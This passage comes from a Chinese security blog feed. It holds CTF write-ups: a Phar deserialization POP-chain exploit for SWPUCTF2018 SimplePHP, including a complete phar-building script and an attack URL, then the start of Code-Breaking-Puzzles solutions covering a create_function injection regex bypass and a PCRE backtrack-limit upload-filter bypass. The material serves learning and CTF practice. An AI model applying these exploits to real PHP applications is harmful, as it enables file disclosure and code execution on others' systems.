</figure><p></p><p>那序列化部分的内容怎么反序列呢？<br>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br><strong>小trick：系统文件操作的函数一般都能使用伪协议流，Phar:// 也是ok的</strong><br>写一段小代码测试一下：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">file_get_contents(<span class="string">"phar://./test.phar/test.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>可以看到成功触发了反序列化</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221220844-ed0aef9a-0529-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="实战运用"><a href="#实战运用" class="headerlink" title="实战运用"></a>实战运用</h2><p>一般情况下，利用Phar反序列漏洞有几个条件：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以上传Phar文件</span><br><span class="line">有可以利用的魔术方法</span><br><span class="line">文件操作函数的参数可控</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="例题：SWPUCTF2018-SimplePHP"><a href="#例题：SWPUCTF2018-SimplePHP" class="headerlink" title="例题：SWPUCTF2018 SimplePHP"></a>例题：SWPUCTF2018 SimplePHP</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>这题有两个功能：1.查看文件。2.上传文件<br>按流程走一下，先查看一波源码<br><code>file.php</code><br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>;</span><br><span class="line">}</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) {</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file)){</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>upload_file.php</code>：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line">upload_file();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>function.php</code><br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>;</span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    <span class="comment">//mkdir("upload",0777);</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) {</span><br><span class="line">        unlink($filename);</span><br><span class="line">    }</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) {</span><br><span class="line">        upload_file_do();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) {</span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;";</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>class.php</code><br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) {</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>file.php中用了<code>file_exists()</code>函数判断读取的文件是否存在，并且源码里面告诉你flag在f1ag.php里面，所以猜测考察用Phar反序列化去读取flag。<br>简单地浏览一下所有的php代码发现只有两个读取系统文件的函数：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()</span><br><span class="line">file_get_contents()</span><br></pre></td></tr></tbody></table></figure><p></p><p>pop链分析<br>首先看到Show类中的_show方法：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221223445-8fb34c80-052d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>可以看到f1ag被ban了，<code>highlight_file</code>利用不了<br>然后再看到Test类里面的file_get方法有<code>file_get_contents</code>函数，再回首file_get是在get方法里面调用的，而get方法是通过触发魔术方法<code>__get()</code>去调用的<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get()：获取类中的一个不可访问属性或者是不存在的属性会调用此方法</span><br></pre></td></tr></tbody></table></figure><p></p><p>那么我们怎么去触发<code>__get</code>呢？再回到类Show中看到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221230155-5b36346e-0531-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>看到这里思路就很清晰了，只要我们把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发<code>__get()</code>了。那么我们如何触发<code>__toString()</code>呢？<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()：将一个实例化对象当做一个字符串来使用时，会自动调用该方法</span><br></pre></td></tr></tbody></table></figure><p></p><p>在看到C1e4r类里面，看到<code>__destruct()</code>刚好有对字符串的输出</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221231440-23664036-0533-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>整个pop链就很清晰了，最后就是写exp了</p><h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>{</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>{</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params = <span class="keyword">array</span>();</span><br><span class="line">}</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    $fun1 = <span class="keyword">new</span> C1e4r();</span><br><span class="line">    $fun2 = <span class="keyword">new</span> Show();</span><br><span class="line">    $fun3 = <span class="keyword">new</span> Test();</span><br><span class="line">    $fun3-&gt;params[<span class="string">'source'</span>]=<span class="string">"/var/www/html/f1ag.php"</span>;</span><br><span class="line">    $fun2-&gt;str = <span class="keyword">array</span>(<span class="string">'str'</span>=&gt;$fun3);</span><br><span class="line">    $fun1-&gt;str = $fun2;</span><br><span class="line">    $phar-&gt;setMetadata($fun1);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>构造文件名<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后的payload<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.79.158.180:11115/file.php?file=phar://./upload/7bd59e11d401afdf6c1d291a33a940b2.jpg</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>getflag：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221233125-7a6a80d4-0535-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="https://paper.seebug.org/680/" title="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="http://php.net/manual/en/phar.fileformat.phar.php" title="http://php.net/manual/en/phar.fileformat.phar.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.phar.php</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code-Breaking-Puzzles做题记录</title>
      <link href="/2018/12/20/Code-Breaking-Puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/12/20/Code-Breaking-Puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/3623" target="_blank" rel="noopener">https://xz.aliyun.com/t/3623</a></p></blockquote><p>传送门：<a href="https://code-breaking.com" title="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a></p><ol><li>function PHP函数利用技巧</li><li>pcrewaf PHP正则特性</li><li>phpmagic PHP写文件技巧</li><li>phplimit PHP代码执行限制绕过</li><li>nodechr Javascript字符串特性</li></ol><h1 id="1-easy-function"><a href="#1-easy-function" class="headerlink" title="1.easy - function"></a>1.easy - function</h1><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) {</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看到<code>$action('',$arg)</code>这里有两个参数，可以想到<code>create_function</code>匿名函数代码注入。那么问题来了，知道怎么执行命令但是正则怎么绕，从这个正则很容易知道只要我们在开头或者结尾加入其他字符就可以绕过了，bp来fuzz一波，发现%5c可以绕过。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175639-b78733c6-004f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>为什么在函数前面加一个”\”也能执行呢，这里涉及到了php的全局命名空间，<code>\create_function</code>就是调用全局的<code>create_function</code>函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175719-cf670570-004f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>看一下手册中的例子就大概知道是什么意思了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215195500-4007efe6-0060-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>既然正则可以绕过了，那么就可以愉快的getflag了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175811-ee3aa3bc-004f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="2-easy-pcrewaf"><a href="#2-easy-pcrewaf" class="headerlink" title="2.easy - pcrewaf"></a>2.easy - pcrewaf</h1><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>{</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) {</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">}  <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>之前看过Ph师傅<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a>，所以这题做起来会很轻松。用php中正则的最大回溯次数<code>（pcre.backtrack_limit）</code>使正则失效，从而导致<code>is_php()</code>返回false。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180103-54ff9b3e-0050-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>PHP中的正则回溯最大次数是100w次，只要超过这个值，正则匹配就会执行失败</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215201327-d3c742e8-0062-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>那么解题的思路就很清晰了，只要上传一个超长的字符串的文件，就可以绕过这个正则表达式了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180121-5f9bd224-0050-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180201-775945b8-0050-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="3-easy-phpmagic"><a href="#3-easy-phpmagic" class="headerlink" title="3.easy - phpmagic"></a>3.easy - phpmagic</h1><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码段1：</span></span><br><span class="line"><span 